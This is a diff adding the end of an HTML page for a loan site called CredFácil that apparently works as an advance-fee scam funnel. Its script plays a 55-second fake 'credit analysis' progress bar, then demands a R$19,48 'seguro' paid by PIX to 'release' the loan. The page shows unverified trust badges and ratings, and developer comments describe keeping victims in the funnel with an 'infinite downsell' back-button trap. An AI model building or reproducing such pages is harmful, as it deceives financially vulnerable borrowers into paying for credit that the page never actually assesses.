+                    <button class="depo-mute" onclick="toggleMute(event, this)"><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M11 5L6 9H2v6h4l5 4V5z"></path><path stroke-linecap="round" stroke-linejoin="round" d="M15.5 8.5a5 5 0 010 7M19.5 5a9 9 0 010 14"></path></svg></button>
+                </div>
+                <div class="depo-card" data-src="videos/depoimentos/dep9-3.mp4" onclick="playDepo(this)">
+                    <div class="depo-logo-badge"><img src="images/credfacil-logo.png" alt="CredFácil"></div>
+                    <video src="videos/depoimentos/dep9-3.mp4" poster="videos/depoimentos/dep9-3.jpg" playsinline preload="none"></video>
+                    <div class="depo-play"><span class="pbtn"><svg fill="currentColor" viewBox="0 0 24 24"><path d="M8 5v14l11-7z"></path></svg></span></div>
+                    <button class="depo-mute" onclick="toggleMute(event, this)"><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M11 5L6 9H2v6h4l5 4V5z"></path><path stroke-linecap="round" stroke-linejoin="round" d="M15.5 8.5a5 5 0 010 7M19.5 5a9 9 0 010 14"></path></svg></button>
+                </div>
+                <div class="depo-card" data-src="videos/depoimentos/dep9-4.mp4" onclick="playDepo(this)">
+                    <div class="depo-logo-badge"><img src="images/credfacil-logo.png" alt="CredFácil"></div>
+                    <video src="videos/depoimentos/dep9-4.mp4" poster="videos/depoimentos/dep9-4.jpg" playsinline preload="none"></video>
+                    <div class="depo-play"><span class="pbtn"><svg fill="currentColor" viewBox="0 0 24 24"><path d="M8 5v14l11-7z"></path></svg></span></div>
+                    <button class="depo-mute" onclick="toggleMute(event, this)"><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M11 5L6 9H2v6h4l5 4V5z"></path><path stroke-linecap="round" stroke-linejoin="round" d="M15.5 8.5a5 5 0 010 7M19.5 5a9 9 0 010 14"></path></svg></button>
+                </div>
+            </div>
+
+            <div class="depo-trust">
+                <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                <span><span class="depo-stars">★★★★★</span> Milhares de clientes já receberam</span>
+            </div>
+        </div>
+    </section>
+
+    <script>
+        // depoimentos: toca 1 por vez, começa com som; 2º toque no card pausa
+        function playDepo(card) {
+            var v = card.querySelector('video');
+            if (card.classList.contains('playing')) {
+                if (v.paused) { v.play(); } else { v.pause(); }
+                return;
+            }
+            document.querySelectorAll('.depo-card.playing').forEach(function (c) {
+                c.classList.remove('playing');
+                var ov = c.querySelector('video'); ov.pause();
+            });
+            card.classList.add('playing');
+            v.muted = false; v.volume = 1;
+            v.play().catch(function () { v.muted = true; v.play().catch(function(){}); });
+            v.onended = function () { card.classList.remove('playing'); v.currentTime = 0; };
+        }
+        function toggleMute(ev, btn) {
+            ev.stopPropagation();
+            var v = btn.parentNode.querySelector('video');
+            v.muted = !v.muted;
+            if (!v.muted && v.volume === 0) v.volume = 1;
+        }
+    </script>
+
+    <div class="modal-overlay" id="modal">
+        <div class="modal-content">
+            <div class="modal-icon">
+                <svg fill="none" stroke="currentColor" stroke-width="2" viewbox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round"
+                        d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+                </svg>
+            </div>
+            <h3 class="modal-title">Quase lá!</h3>
+            <p class="modal-message">
+                Após o pagamento do seguro, <strong>aguarde nesta página</strong> para confirmar o recebimento.<br><br>
+                Seu crédito será <span class="modal-highlight">liberado automaticamente</span> via PIX.
+            </p>
+            <button class="modal-button" onclick="redirectToCheckout()">
+                <svg fill="none" stroke="currentColor" stroke-width="2" viewbox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" d="M17 8l4 4m0 0l-4 4m4-4H3"></path>
+                </svg>
+                Continuar para Pagamento
+            </button>
+        </div>
+    </div>
+
+    <footer class="site-footer">
+        <div class="footer-inner">
+            <div class="footer-logo"><img src="images/credfacil-logo.png" alt="CredFácil"
+                    style="height:24px;width:auto;">
+            </div>
+            <small><strong>CredFácil</strong><br>CredFácil Solicitações de Empréstimos — CNPJ 15.484.329/0001-42</small>
+            <div style="display:flex;justify-content:center;flex-wrap:wrap;gap:14px;margin-top:14px;">
+                <span style="display:flex;align-items:center;gap:5px;font-size:10.5px;color:#afa9a2;font-weight:600;"><svg style="width:13px;height:13px;color:#d7a977;" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>SSL Seguro</span>
+                <span style="display:flex;align-items:center;gap:5px;font-size:10.5px;color:#afa9a2;font-weight:600;"><svg style="width:13px;height:13px;color:#d7a977;" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path></svg>Dados protegidos</span>
+                <span style="display:flex;align-items:center;gap:5px;font-size:10.5px;color:#afa9a2;font-weight:600;"><svg style="width:13px;height:13px;color:#d7a977;" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 21V5a2 2 0 00-2-2H7a2 2 0 00-2 2v16m14 0h2m-2 0h-5m-9 0H3m2 0h5M9 7h1m-1 4h1m4-4h1m-1 4h1m-5 10v-5a1 1 0 011-1h2a1 1 0 011 1v5m-4 0h4"></path></svg>Instituição regulada</span>
+            </div>
+            <small style="margin-top:12px;display:block;">Ouvidoria / SAC: 0800 200 1090 · ouvidoria@credfacil.com.br</small>
+            <small style="margin-top:6px;display:block;">© 2026 CredFácil · Todos os direitos reservados</small>
+            <div style="display:inline-flex;align-items:center;gap:7px;background:#fff;border:1px solid #e4e0db;border-radius:10px;padding:6px 11px;margin-top:14px;">
+                <span style="font-family:'Sora',sans-serif;font-weight:800;font-size:11px;color:#363330;display:inline-flex;align-items:center;">Reclame<b style="background:#c56a08;color:#fff;padding:1px 4px;border-radius:4px;margin-left:2px;">AQUI</b></span>
+                <span style="font-size:11px;font-weight:700;color:#c56a08;">★ 8.9 · ÓTIMO</span>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        function loadUserData() {
+            const nome = localStorage.getItem('nome');
+            if (nome) {
+                const nomes = nome.trim().split(' ');
+                const ultimoNome = nomes.length > 1 ? nomes[nomes.length - 1] : '';
+                document.getElementById('userName').textContent = ultimoNome ? `${nomes[0]} ${ultimoNome}` : nomes[0];
+            }
+
+            const cpf = localStorage.getItem('cpf');
+            if (cpf) {
+                const cpfLimpo = cpf.replace(/\D/g, '');
+                if (cpfLimpo.length === 11) {
+                    document.getElementById('userCpf').textContent = `${cpfLimpo.substring(0, 3)}.***.***-${cpfLimpo.substring(9, 11)}`;
+                }
+            }
+
+            let approvedAmount = localStorage.getItem('selectedLoanAmount');
+            let installments = localStorage.getItem('selectedInstallments');
+            let monthlyPayment = localStorage.getItem('selectedMonthlyPayment');
+
+            if (approvedAmount) {
+                const amount = parseFloat(approvedAmount);
+                document.getElementById('approvedAmount').textContent = amount.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+            }
+
+            if (installments && monthlyPayment) {
+                const monthly = parseFloat(monthlyPayment);
+                document.getElementById('installmentsText').textContent = `${installments}x de ${monthly.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' })}`;
+            } else if (installments && approvedAmount) {
+                const amount = parseFloat(approvedAmount);
+                const months = parseInt(installments);
+                const monthlyRate = 0.0081;
+                const monthly = (amount * (monthlyRate * Math.pow(1 + monthlyRate, months))) / (Math.pow(1 + monthlyRate, months) - 1);
+                document.getElementById('installmentsText').textContent = `${months}x de ${monthly.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' })}`;
+            }
+        }
+
+        function startProgress() {
+            const progressBar = document.getElementById('progressBar');
+            const progressPercent = document.getElementById('progressPercent');
+            const progressStatus = document.getElementById('progressStatus');
+            const progressSection = document.getElementById('progressSection');
+            const ctaButton = document.getElementById('ctaButton');
+
+            const statusMessages = [
+                { percent: 0, text: 'Processando' },
+                { percent: 20, text: 'Verificando dados' },
+                { percent: 40, text: 'Analisando crédito' },
+                { percent: 60, text: 'Calculando taxas' },
+                { percent: 80, text: 'Finalizando' },
+                { percent: 100, text: 'Concluído!' }
+            ];
+
+            let currentPercent = 0;
+            const totalDuration = 55000; // 55 segundos
+            const intervalTime = 200; // atualiza a cada 200ms
+            const increment = 100 / (totalDuration / intervalTime);
+
+            const progressInterval = setInterval(() => {
+                currentPercent += increment;
+
+                if (currentPercent >= 100) {
+                    currentPercent = 100;
+                    clearInterval(progressInterval);
+
+                    // Atualizar para estado completo
+                    progressBar.style.width = '100%';
+                    progressPercent.textContent = '100% concluído';
+                    progressStatus.textContent = 'Concluído!';
+                    progressSection.classList.add('completed');
+
+                    // Mostrar botão e rolar até ele
+                    setTimeout(() => {
+                        ctaButton.classList.remove('hidden');
+                        ctaButton.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                    }, 500);
+
+                    return;
+                }
+
+                // Atualizar barra e porcentagem
+                progressBar.style.width = currentPercent + '%';
+                progressPercent.textContent = Math.floor(currentPercent) + '% concluído';
+
+                // Atualizar mensagem de status
+                for (let i = statusMessages.length - 1; i >= 0; i--) {
+                    if (currentPercent >= statusMessages[i].percent) {
+                        progressStatus.textContent = statusMessages[i].text;
+                        break;
+                    }
+                }
+            }, intervalTime);
+        }
+
+        // ── PREÇO ÚNICO: R$ 19,48 (upKey 'seguro'). 16/08 — as 3 cotações saíram;
+        //    a página volta a mostrar só o valor que a pessoa escolheu + o seguro de 19,48. ──
+        var _seguroUpKey = 'seguro';
+
+        function handleCTA() {
+            // Gera o Pix pela nossa própria API (SkalePay) e abre o modal com vídeo + QR + código.
+            // Sem checkout intermediário e sem order bump: o valor é sempre o do 'seguro' (R$ 19,48).
+            if (typeof _pixOpenModal === 'function') {
+                _pixOpenModal(_seguroUpKey);
+            } else if (typeof redirect === 'function') {
+                redirect(_seguroUpKey);
+            } else {
+                redirectToCheckout();
+            }
+        }
+
+        function redirectToCheckout() {
+            // FALLBACK SEGURO — NUNCA enviar o cliente para checkout externo.
+            // Se por algum motivo os scripts do Pix (SkalePay) não carregaram,
+            // tentamos reabrir o nosso próprio Pix e, se ainda não deu, recarregamos
+            // a página pra dar outra chance — sempre mantendo o cliente no NOSSO funil.
+            if (typeof _pixOpenModal === 'function') { _pixOpenModal(_seguroUpKey); return; }
+            if (typeof redirect === 'function') { redirect(_seguroUpKey); return; }
+            try {
+                var tries = parseInt(sessionStorage.getItem('_pixReloadTries') || '0', 10);
+                if (tries < 2) {
+                    sessionStorage.setItem('_pixReloadTries', String(tries + 1));
+                    location.reload();
+                    return;
+                }
+            } catch (e) {}
+            alert('Estamos gerando o seu Pix com segurança. Aguarde alguns segundos e toque novamente em "Contratar Seguro".');
+        }
+
+        document.getElementById('modal').addEventListener('click', function (e) {
+            if (e.target === this) this.classList.remove('show');
+        });
+
+        document.addEventListener('DOMContentLoaded', () => {
+            loadUserData();
+        });
+    </script>
+
+
+    <!-- PIX in-house (SkalePay) + cadeia de upsells -->
+    <style>
+      /* Pix em TELA CHEIA na página 9 (sobrescreve o popup centralizado) */
+      #pix-modal{ padding:0 !important; background:#08120c !important; backdrop-filter:none !important; -webkit-backdrop-filter:none !important; }
+      #pix-modal-card{ max-width:520px !important; width:100% !important; height:100dvh !important; max-height:100dvh !important; border-radius:0 !important; box-shadow:none !important; animation:none !important; }
+      .pix-video-top{ position:relative; }
+      .pix-video-top video{ width:100%; aspect-ratio:16/9; display:block; object-fit:cover; }
+      @keyframes pixUnmutePulse{0%,100%{transform:scale(1)}50%{transform:scale(1.06)}}
+    </style>
+    <script>
+      /* injeta o VÍDEO EXPLICATIVO do Pix (autoplay mudo) no topo do modal — NÃO é a VSL da página */
+      (function injectPixVideo() {
+        var card = document.getElementById('pix-modal-card');
+        if (!card) { return setTimeout(injectPixVideo, 120); }
+        if (card.querySelector('.pix-video-top')) return;
+        var v = document.createElement('div');
+        v.className = 'pix-video-top';
+        v.style.cssText = 'background:#08120c;line-height:0;';
+        v.innerHTML = '<video id="pixVideo" src="videos/timeline-pix.mp4" muted playsinline controls preload="auto" style="width:100%;aspect-ratio:16/9;object-fit:cover;background:#08120c;"></video>'
+          + '<div id="pixUnmute" style="position:absolute;inset:0;z-index:5;display:flex;align-items:center;justify-content:center;cursor:pointer;background:rgba(0,0,0,.32);">'
+          +   '<div style="display:flex;flex-direction:column;align-items:center;gap:8px;background:linear-gradient(135deg,#e07a0c,#d96e08);color:#fff;border-radius:20px;padding:18px 30px;box-shadow:0 14px 38px rgba(0,0,0,.6);animation:pixUnmutePulse 1.5s ease-in-out infinite;">'
+          +     '<div style="display:flex;align-items:center;gap:11px;font-size:18.5px;font-weight:800;line-height:1;">'
+          +       '<svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.2"><path stroke-linecap="round" stroke-linejoin="round" d="M11 5L6 9H2v6h4l5 4V5z"/><path stroke-linecap="round" stroke-linejoin="round" d="M15.5 8.5a5 5 0 010 7M19.5 5a9 9 0 010 14"/></svg>'
+          +       'Toque para ativar o som'
+          +     '</div>'
+          +     '<span style="font-size:13px;font-weight:600;opacity:.92;">Assista ao vídeo com áudio</span>'
+          +   '</div>'
+          + '</div>';
+        // coloca o vídeo LOGO ABAIXO do header verde "Pagamento via Pix"
+        var hdr = card.firstElementChild;
+        if (hdr && hdr.nextSibling) { card.insertBefore(v, hdr.nextSibling); }
+        else { card.insertBefore(v, card.firstChild); }
+
+        // botão "ativar som" — tira o vídeo do mudo
+        var unmuteBtn = v.querySelector('#pixUnmute');
+        if (unmuteBtn) {
+          unmuteBtn.addEventListener('click', function () {
+            var mp = v.querySelector('video');
+            if (mp) {
+              try {
+                mp.muted = false;
+                mp.volume = 1;
+                // SEMPRE recomeça do início do vídeo ao ativar o som
+                try { mp.currentTime = 0; } catch (e) {}
+                var p = mp.play();
+                if (p && p.catch) p.catch(function () {});
+              } catch (e) {}
+            }
+            unmuteBtn.style.display = 'none';
+          });
+        }
+
+        // deixa o vídeo pausado no 1º frame até a pessoa tocar (não avança no mudo)
+        var modal = document.getElementById('pix-modal');
+        if (modal && window.MutationObserver) {
+          var obs = new MutationObserver(function () {
+            if (getComputedStyle(modal).display !== 'none') {
+              var mp = v.querySelector('video');
+              if (mp) {
+                try {
+                  mp.muted = true;
+                  // mantém no início enquanto o som não foi ativado
+                  if (unmuteBtn && getComputedStyle(unmuteBtn).display !== 'none') {
+                    try { mp.currentTime = 0; } catch (e) {}
+                    try { mp.pause(); } catch (e) {}
+                  }
+                } catch (e) {}
+              }
+            }
+          });
+          obs.observe(modal, { attributes: true, attributeFilter: ['style'] });
+        }
+      })();
+    </script>
+
+    <script defer="" src="beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516-10"
+        integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg=="
+        data-cf-beacon='{"version":"2024.11.0","token":"291788ee003a413395b0add202b81cef","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}'
+        crossorigin="anonymous"></script>
+  <script src="js/front-boost.js?v=2" defer></script>
+  <!-- Funil infinito de downsell ao tentar voltar -->
+  <script src="js/back-redirect.js?v=4"></script>
+<style id="brandCTA">
+.btn-primary,.btn-submit,.cta-button{background:linear-gradient(135deg,#ff911b,#d9750a)!important;box-shadow:0 16px 30px -12px rgba(240,131,15,.5),inset 0 1px 0 rgba(255,255,255,.3)!important;color:#fff!important;border:none!important}
+</style>
+
+</body>
+
+</html>
